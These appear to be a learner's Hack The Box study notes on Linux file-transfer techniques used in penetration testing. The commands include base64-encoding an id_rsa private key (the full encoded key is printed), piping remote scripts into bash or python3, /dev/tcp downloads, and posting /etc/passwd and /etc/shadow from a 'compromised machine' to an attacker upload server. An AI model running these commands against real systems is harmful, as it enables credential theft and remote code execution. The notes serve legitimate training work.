# ☔ Linux File Transfer

Same as for the windows techniques we can send files by checking their md5sum signature and encoding it in base64 ->

```shell-session
ElFelixi0@htb[/htb]$ md5sum id_rsa

4e301756a07ded0a2dd6953abf015278  id_rsa
```

Then encode the file to base64 ->

```shell-session
ElFelixi0@htb[/htb]$ cat id_rsa |base64 -w 0;echo
```

and we can decode it on the other machine ->

```shell-session
ElFelixi0@htb[/htb]$ echo -n 'LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo=' | base64 -d > id_rsa
```

and confirm that the file is still the same ->

```shell-session
md5sum id_rsa
```

***

#### Web downloads

We are going to use wget and cURL ->

wget requires -O as output file whereas cURL requires -o ->

**wget**

```shell-session
ElFelixi0@htb[/htb]$ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
```

**cURL**

```shell-session
ElFelixi0@htb[/htb]$ curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```

#### Fileless Attacks Using Linux

This technique means we don't have to download a file to execute it

with curl ->

```shell-session
curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```

For example we can also download python scirpt and execute it without downloading it:

```shell-session
wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
```

***

As long as Bash version 2.04 or greater is installed /dev/TCP device file can be used for simple file downloads.

```shell-session
exec 3<>/dev/tcp/10.10.10.32/80
```

**HTTP Get requests ->**

```shell-session
echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
```

and to print the response ->

```shell-session
cat <&3
```

***

### SSH Downloads

SSH implementation comes with an `SCP` utility for remote file transfer that, by default, uses the SSH protocol.

We first need to set up an SSH server on our local machine ->

```shell-session
sudo systemctl enable ssh
sudo systemctl start ssh
netstat -lnpt # checks for listening port
```

And to dowload using scp we can use the following ->

```shell-session
scp plaintext@192.168.49.128:/root/myroot.txt . 
```

***

we can use [uploadserver](https://github.com/Densaugeo/uploadserver), an extended module of the Python `HTTP.Server` module, which includes a file upload page.

```shell-session
sudo python3 -m pip install --user uploadserver
```

we need to create a certificate. In this example, we are using a self-signed certificate.

```shell-session
ElFelixi0@htb[/htb]$ openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'

Generating a RSA private key
................................................................................+++++
.......+++++
writing new private key to 'server.pem'
```

Then we start the webserver

```shell-session
mkdir https && cd https
sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
```

And now from our compromised machine we send 2 important files to local machine ->

```shell-session
curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```

`--insecure` because we used a self-signed certificate that we trust.

***

**Python3**

```shell-session
python3 -m http.server
```

**Python2.7**

```shell-session
python2.7 -m SimpleHTTPServer
```

**PHP**

```shell-session
php -S 0.0.0.0:8000
```

**Ruby**

```shell-session
ruby -run -ehttpd . -p8000
```

And we can get the files with the following command ->

```shell-session
wget 192.168.49.128:8000/filetotransfer.txt
```

**SCP upload**

```shell-session
scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/
```
